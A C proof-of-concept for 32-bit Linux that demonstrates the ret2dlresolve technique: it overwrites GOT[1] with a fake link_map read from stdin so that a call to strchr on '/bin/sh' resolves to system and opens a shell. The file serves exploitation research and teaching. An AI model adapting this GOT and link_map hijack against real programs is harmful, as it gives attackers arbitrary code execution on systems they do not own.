/* return_to_fixup POC2 example
 * for x32 arch
 *
 * read fake_link_map from stdin, should be launched from python
 *
 * $ gcc -m32 poc2_fixup.c -o poc2_fixup
 *  (LD_BIND_NOW must not be set in this POC!)
 *
 * launch with python:
 * $ python launch_poc2.py poc2_fixup
 */

// ============================================================================
// standard libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

// ============================================================================
// POC includes: define struct link_map and other stuff from libc
// for easy life
// 32 bit for now
#define __ELF_NATIVE_CLASS 32
#include "glib_link.h"

#define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
#define ELFW(type)  _ElfW (ELF, __ELF_NATIVE_CLASS, type)

#define reloc_offset reloc_arg * sizeof (PLTREL)
#define reloc_index  reloc_arg

#define VERSYMIDX(sym)  (DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX (sym))

// ============================================================================
// POC globals

struct link_map _lm; // just for debug print function
// doesn't work, equals to _DYNAMIC after compilation
// TODO: hardcoded value now, make variable
ElfW(Word) _GOT_;
uint32_t reloc_arg;

char buf[1024] = {0}; // we will read link_map from stdin to this buffer

// fake_link_map, stored in _lm global variable
struct link_map *fake_link_map = (struct link_map*) buf;
// original content of GOT[1], initialized in main
struct link_map *orig_link_map;
// helper typedef
typedef void **PArray;

// ============================================================================
// debug prints to check some vallues
/*! print size of used structures
 */
void dprint_structures()
{
    
}
/*! print info about link_map structure
 */
void dprint_linkmap()
{
    printf("l_scope offset: %x\n", (int)&(_lm.l_scope) - (int)&(_lm));
}
// ============================================================================
// POC functions

// flag: 0 if GOT[1] contains original link_map, 1 if fake_link_map
int reloc_state = 0;
/*! helper function:
 * swaps orig_link_map and fake_link_map
 */
int swap_reloc_addr()
{
    if (!reloc_state){
        ((PArray)_GOT_)[1] = fake_link_map;
    } else {
        ((PArray)_GOT_)[1] = orig_link_map;
    }
    reloc_state = !reloc_state;
    return reloc_state;
}

/*! print old_link_map address and 
 *  read fake_link_map structure from stdin
 */
void fill_link_map_stdin(struct link_map *dst, struct link_map *src, uint32_t reloc_arg)
{
    // print addr of original link_map and reloc_arg in easy to parse way
    printf("%u outputs\n", 3);
    printf("%u %u %u\n", (int) dst, (int) src, (int) reloc_arg);
    printf("end %u outputs\n", 3);
    // read number of bytes in fake_link_map
    int payload_length;
    scanf("%u", &payload_length);
    // read fake_link_map itself
    printf("length of fake_link_map is %u\n", payload_length);
    read(0, dst, payload_length);
    printf("\nfinish\n");
}

int main(void)
{
    dprint_linkmap();
    printf("%d: enter address of GOT and puts's reloc_arg in hex\n", 0);
    scanf("%x %x", &_GOT_, &reloc_arg);
    printf("addr of _GOT_ = 0x%x, reloc_arg = 0x%x\n", _GOT_, reloc_arg);

    // initialize orig_link_map
	orig_link_map = ((PArray)_GOT_)[1];	

    fill_link_map_stdin(fake_link_map, orig_link_map, reloc_arg);

    // replace GOT[1]: from orig_link_map to fake_link_map
    swap_reloc_addr();
    // now call strchr but actually execute system!
    char binsh[] = "/bin/sh";
    // WARNING: in this POC strchr must be called first time here,
    // cause we want a relatively simple demo programm
    // if puts was called earlie, POC won't work (cuz dl_dixup won't be called)
	// also, LD_BIND_NOW must not be set, cuz dl_fixup won't be called either
    char *pos = strchr(binsh, 's');
    printf("s is on %d place\n", pos - binsh);
    return 0;
}
